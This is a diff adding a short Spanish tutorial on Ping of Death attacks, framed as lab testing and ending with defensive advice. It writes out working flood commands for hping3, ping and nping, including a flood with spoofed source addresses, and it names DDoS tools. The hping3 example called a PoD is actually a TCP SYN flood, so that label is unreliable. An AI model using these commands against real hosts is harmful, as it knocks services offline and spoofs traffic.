@@ -1,0 +1,48 @@
+🔧 Ataques tipo Ping of Death (PoD)
+
+Este ataque consiste en enviar paquetes ICMP mal formados o demasiado grandes, superando el límite de 65.535 bytes, lo que puede causar un buffer overflow en sistemas vulnerables.
+
+Aunque la mayoría de los sistemas modernos ya no son vulnerables al PoD clásico, aún puedes simular escenarios parecidos con herramientas de red.
+✅ Herramientas que puedes usar para pruebas controladas
+1. hping3
+
+Es una herramienta muy poderosa para construir paquetes TCP/IP personalizados, incluyendo ICMP. Puedes instalarla con:
+
+sudo apt install hping3
+
+Ejemplo básico de PoD simulado:
+
+sudo hping3 -c 1000 -d 65000 -S -w 64 -p 80 --flood --rand-source 192.168.1.100
+
+    -c 1000: envía 1000 paquetes
+
+    -d 65000: tamaño de los datos (simulando gran carga)
+
+    --flood: ataque de inundación
+
+    --rand-source: falsifica IPs de origen (usa con precaución)
+
+    Reemplaza 192.168.1.100 por tu IP de prueba
+
+2. ping -s (Linux/macOS)
+
+ping -s 65507 192.168.1.100
+
+    El tamaño máximo del payload permitido por ICMP es 65507 bytes en Linux (después del header).
+
+3. nping (parte de Nmap)
+
+nping --icmp --data-length 65000 192.168.1.100
+
+4. LOIC / HOIC / Slowloris / XERXES
+
+Estas herramientas son más invasivas y se usan en pruebas de DDoS, pero sólo deberían usarse en un entorno cerrado (laboratorio o servidor personal sin conexión pública).
+🛡️ Recomendación
+
+Hazlo desde una máquina virtual con Kali Linux o Parrot OS hacia un servidor en tu red local o un VPS tuyo. Si el servidor cae, sabrás que necesitas:
+
+    Limitar ICMP en el firewall
+
+    Configurar un WAF
+
+    Implementar un sistema de detección como Fail2Ban, Suricata o Snort
